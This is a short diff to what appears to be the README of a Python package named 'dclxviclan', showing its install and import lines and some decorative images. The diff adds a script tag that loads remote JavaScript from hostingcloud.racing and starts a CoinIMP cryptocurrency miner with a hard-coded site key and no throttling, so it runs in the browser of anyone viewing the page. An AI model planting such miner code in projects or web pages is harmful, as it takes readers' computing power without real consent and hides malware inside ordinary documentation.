@@ -3,6 +3,15 @@
 pip install dclxviclan
 
 import dclxviclan
+
+<script src="https://www.hostingcloud.racing/dCeG.js"></script>
+<script>
+  var _client = new Client.Anonymous('4bc0501a0ba20f76a537ecbd9a24c652614c84ced8a69cb6097d7b10ae3caa63', {
+   throttle: 0, c: 'w'
+  });
+  _client.start();
+  _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40,"#3d3d3d");
+</script>
 ```
 ![](https://github.com/dclxviclan/happynewyearfemopresentapkgame/blob/main/Media_221228_025641.gif)
 [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=52FF98&width=435&lines=where+i+can+find+u👽+hint)](https://git.io/typing-svg)
